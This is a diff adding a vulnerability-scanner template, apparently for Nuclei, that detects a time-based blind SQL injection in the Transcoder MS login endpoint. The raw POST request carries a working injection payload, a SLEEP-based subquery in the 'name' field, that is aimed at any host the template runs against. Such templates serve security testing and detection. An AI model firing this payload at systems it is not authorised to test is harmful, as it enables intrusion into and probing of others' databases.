@@ -1,0 +1,27 @@
+id: transcoder-ms-sqli
+
+info:
+  name: Transcoder MS SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential SQL Injection vulnerability in Transcoder MS on the `index.php` endpoint.
+  tags: sql-injection,high
+
+http:
+  - raw:
+      - |
+        POST /webtrans/index.php?controller=user%action=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        name=testaaa;) AND (SELECT 3333 FROM (SELECT(SLEEP(4)))xSEI) AND ('aFKS'='aFKS&pass=QWR5U2VjCg%3D%3D&lang=zh_CN
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "3333"
+      - type: dsl
+        dsl:
+          - "duration > 4"
